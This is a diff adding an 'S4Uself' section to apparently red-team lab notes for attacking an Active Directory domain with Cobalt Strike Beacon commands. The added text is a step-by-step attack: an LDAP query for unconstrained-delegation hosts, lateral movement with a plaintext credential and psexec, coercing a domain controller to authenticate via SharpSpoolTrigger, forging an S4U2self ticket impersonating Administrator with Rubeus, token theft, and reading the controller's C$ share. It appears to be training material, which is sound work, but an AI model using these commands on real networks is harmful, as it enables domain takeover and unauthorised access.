@@ -139,3 +139,54 @@
 -  Use the ticket to list the C$ share on _lon-dc-1_.
     
     1. ls \\lon-dc-1\c$
+
+
+### S4Uself 
+
+- Use LDAP to find computers configured with unconstrained delegation.
+    
+    BeaconTypeCopy
+    
+    `ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname`
+    
+-  Move laterally to _lon-ws-1_.
+    
+    2.  make_token CONTOSO\rsteel Passw0rd!
+    3.  jump psexec64 lon-ws-1 smb
+-  Run Rubeus in monitor mode on _lon-ws-1_.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap`
+    
+-  From the medium-integrity Beacon, use a remote authentication trigger to force _lon-dc-1_ to authenticate to _lon-ws-1_.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1`
+    
+    > You may need to run it a few times.
+    
+-  Use the TGT to request a usable service ticket for cifs/lon-dc-1, impersonating the default domain administrator.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap`
+    
+    > The **/self** parameter is key here.
+    
+-  Inject the ticket into a sacraficial logon session.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
+    
+-  Impersonate the process.
+    
+    1. steal_token [PID]
+-  Verify the ticket was injected.
+    
+    1. run klist
+-  Use the ticket to list the C$ share on _lon-dc-1_.
+    
+    1. ls \\lon-dc-1\c$
